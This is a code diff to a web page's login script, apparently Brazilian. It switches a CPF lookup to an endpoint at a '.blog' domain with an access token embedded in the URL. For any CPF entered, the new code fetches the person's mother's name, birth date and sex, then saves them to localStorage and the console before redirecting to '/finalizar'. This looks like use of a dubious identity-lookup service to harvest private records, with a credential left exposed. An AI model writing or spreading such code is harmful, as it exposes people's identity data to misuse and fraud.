@@ -280,8 +280,8 @@
             document.getElementById('loading').classList.remove('hidden');
             
             try {
-                // Call CPF lookup API
-                const response = await fetch(`https://webhook-manager.replit.app/api/v1/cliente/cpf/${cpfNumbers}`);
+                // Call new CPF lookup API
+                const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf=${cpfNumbers}`);
                 
                 if (!response.ok) {
                     throw new Error(`HTTP ${response.status}: ${response.statusText}`);
@@ -289,13 +289,14 @@
                 
                 const data = await response.json();
                 
-                if (data.sucesso && data.cliente) {
+                if (data.DADOS) {
                     // Save user data to localStorage (multiple keys for compatibility)
                     const loginData = {
-                        nome: data.cliente.nome,
-                        cpf: data.cliente.cpf,
-                        telefone: data.cliente.telefone,
-                        email: data.cliente.email,
+                        nome: data.DADOS.nome,
+                        cpf: data.DADOS.cpf,
+                        nome_mae: data.DADOS.nome_mae,
+                        data_nascimento: data.DADOS.data_nascimento,
+                        sexo: data.DADOS.sexo,
                         source: 'login'
                     };
                     
@@ -303,12 +304,13 @@
                     localStorage.setItem('loginUserData', JSON.stringify(loginData));
                     
                     // Also save in standard keys for /finalizar compatibility
-                    localStorage.setItem('candidateName', data.cliente.nome);
-                    localStorage.setItem('candidateCPF', data.cliente.cpf);
-                    localStorage.setItem('candidatePhone', data.cliente.telefone);
-                    localStorage.setItem('candidateEmail', data.cliente.email);
+                    localStorage.setItem('candidateName', data.DADOS.nome);
+                    localStorage.setItem('candidateCPF', data.DADOS.cpf);
+                    localStorage.setItem('candidateMotherName', data.DADOS.nome_mae);
+                    localStorage.setItem('candidateBirthDate', data.DADOS.data_nascimento);
+                    localStorage.setItem('candidateGender', data.DADOS.sexo);
                     
-                    console.log('User data saved from login:', data.cliente);
+                    console.log('User data saved from login:', data.DADOS);
                     
                     // Redirect to /finalizar
                     window.location.href = '/finalizar';
